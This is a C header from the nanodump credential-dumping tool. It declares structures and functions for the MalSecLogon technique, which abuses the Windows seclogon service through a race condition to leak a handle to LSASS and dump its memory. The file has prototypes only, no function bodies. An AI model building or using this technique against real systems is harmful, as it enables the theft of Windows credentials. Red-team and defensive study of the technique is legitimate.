#pragma once

#include <windows.h>
#include <winternl.h>

#include "nanodump.h"
#include "handle.h"
#include "dinvoke.h"

#if defined(NANO) && !defined(SSP)

#define MAX_HANDLES 10000
#define INVALID_HANDLE 6

typedef struct _HANDLE_LIST
{
    ULONG Count;
    HANDLE Handle[MAX_HANDLES];
} HANDLE_LIST, *PHANDLE_LIST;

struct TEB
{
    struct _NT_TIB NtTib;
    VOID* EnvironmentPointer;
    struct _CLIENT_ID ClientId;
    VOID* ActiveRpcHandle;
    VOID* ThreadLocalStoragePointer;
    struct _PEB* ProcessEnvironmentBlock;
};

typedef struct _FILE_PROCESS_IDS_USING_FILE_INFORMATION
{
    ULONG NumberOfProcessIdsInList;
    ULONG_PTR ProcessIdList[1];
} FILE_PROCESS_IDS_USING_FILE_INFORMATION, * PFILE_PROCESS_IDS_USING_FILE_INFORMATION;

typedef struct _THREAD_PARAMETERS
{
    DWORD pid;
    LPWSTR cmdline;
    PBOOL file_lock_was_triggered;
} THREAD_PARAMETERS, *PTHREAD_PARAMETERS;

#define FileProcessIdsUsingFileInformation 47

typedef BOOL(WINAPI* CreateProcessWithLogonW_t) (LPCWSTR lpUsername, LPCWSTR lpDomain, LPCWSTR lpPassword, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
typedef BOOL(WINAPI* CreateProcessWithTokenW_t) (HANDLE hToken, DWORD dwLogonFlags, LPCWSTR lpApplicationName, LPWSTR lpCommandLine, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);

#define CreateProcessWithLogonW_SW2_HASH 0x39A92305
#define CreateProcessWithTokenW_SW2_HASH 0x03A92535

PHANDLE_LIST find_token_handles_in_process(
    IN DWORD process_pid,
    IN DWORD permissions);

PHANDLE_LIST find_process_handles_in_process(
    IN DWORD process_pid,
    IN DWORD permissions);

VOID change_pid(
    IN DWORD new_pid,
    OUT PDWORD previous_pid);

VOID set_command_line(
    IN BOOL use_malseclogon_locally,
    IN LPWSTR command_line,
    IN LPCSTR program_name,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig);

BOOL save_new_process_pid(
    IN PPROCESS_LIST process_list,
    IN DWORD pid);

BOOL check_if_succeded(
    IN DWORD new_pid,
    IN LPCSTR dump_path);

VOID kill_created_processes(
    IN PPROCESS_LIST created_processes);

BOOL MalSecLogon(
    IN LPCSTR binary_path,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_malseclogon_locally,
    IN DWORD lsass_pid,
    OUT PPROCESS_LIST* Pcreated_processes);

BOOL malseclogon_stage_1(
    IN LPCSTR program_name,
    IN LPCSTR dump_path,
    IN BOOL fork_lsass,
    IN BOOL snapshot_lsass,
    IN BOOL use_valid_sig,
    IN BOOL use_malseclogon_locally,
    IN DWORD lsass_pid,
    OUT PPROCESS_LIST process_list);

VOID malseclogon_trigger_lock(
    IN DWORD lsass_pid,
    IN LPWSTR cmdline,
    IN PBOOL file_lock_was_triggered);

DWORD WINAPI thread_seclogon_lock(
    IN LPVOID lpParam);

BOOL leak_lsass_handle_in_seclogon_with_race_condition(
    IN DWORD lsass_pid,
    OUT PHANDLE hEvent,
    OUT PHANDLE hFile);

DWORD get_pid_using_file_path(
    IN LPWSTR file_path);

DWORD get_seclogon_pid(VOID);

HANDLE malseclogon_race_condition(
    IN DWORD lsass_pid);

#ifdef EXE
HANDLE malseclogon_stage_2(
    IN LPCSTR dump_path);
#endif

#endif
